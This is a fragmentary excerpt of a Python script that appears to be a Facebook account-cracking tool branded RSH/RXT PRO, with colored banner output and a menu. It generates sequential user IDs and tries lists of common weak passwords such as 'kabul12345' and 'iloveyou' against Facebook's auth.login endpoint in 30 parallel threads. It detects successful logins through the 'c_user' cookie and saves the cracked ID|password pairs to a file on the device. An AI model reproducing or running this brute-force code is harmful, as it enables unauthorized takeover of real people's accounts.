...
----------------------------------------------
\033[1;34m Author    : Saadat\033[1;37m
\033[1;34m Github    : RaziqSH\033[1;37m
\033[1;34m Facebook  : Raziqullah saadat\033[1;37m
\033[1;34m Tool Name : RSH\033[1;37m
 \033[1;34mType type : TRAIL VERSION
 \033[1;34mVersion   : 4.0.
----------------------------------------------
 RXT PRO VERSION 4.0.0
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def public():
        ...
        linex()
        print(' [1] Method 1 (is the good) \n [2] Method 2 (is the best)\n [3] Method 3 (is the batter)')
        linex()
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'۱۲۳۴۵۶','','kabul12345','kabul1234','kabul12','afghan123','kabul123','kabul123456','afghanistan','786786']
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Afghanistan','Afghanistan','i love you','iloveyou','free fire','freefire']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Saadat] %s | %s'%(ids,pas))
                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Saadat:
                                if 'y' in pcp:
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                data = {'adid':adid,
                                        ...
                                        "locale":"en_Afg.pak","client_country_code":"Afg.pak",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
